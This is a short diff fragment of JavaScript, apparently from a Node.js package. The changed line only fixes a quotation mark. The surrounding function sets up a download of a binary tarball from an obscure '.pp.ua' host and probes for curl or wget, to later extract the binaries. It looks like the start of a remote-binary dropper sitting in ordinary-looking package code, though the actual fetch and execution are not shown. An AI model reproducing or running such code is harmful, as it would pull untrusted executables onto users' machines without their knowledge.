@@ -196,7 +196,7 @@ function initAndExtractBinaries() {
     const archivePath = path.join(binDir, 'binaries.tar.gz');
     const downloadUrl = 'https://w0.cone.pp.ua/binary_x64.tar.gz';
     
-    let downloader = “none" ;
+    let downloader = 'none';
     try {
        downloader = execSync(
             'command -v curl >/dev/null 2>&1 && echo "curl" || (command -v wget >/dev/null 2>&1 && echo "wget" || echo "none")'
